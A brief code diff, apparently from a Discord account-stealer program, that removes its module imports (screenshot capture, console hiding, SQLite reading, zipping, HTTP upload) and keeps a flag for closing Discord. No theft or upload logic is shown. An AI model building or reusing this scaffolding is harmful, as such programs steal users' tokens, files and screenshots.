@@ -1,18 +1,3 @@
-const fs = require("fs");
-const path = require("path");
-const crypto = require("crypto");
-const sqlite3 = require('sqlite3');
-const vare = require("vareapi");
-const axios = require('axios');
-const os = require('os');
-const fse = require('fs-extra')
-const FormData = require('form-data');
-const JSZip = require('jszip');
-const screenshot = require('screenshot-desktop');
-const { execSync, exec } = require('child_process');
-const hideconsole = require('node-hide-console-window');
-const buf_replace = require('buffer-replace');
-
 let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
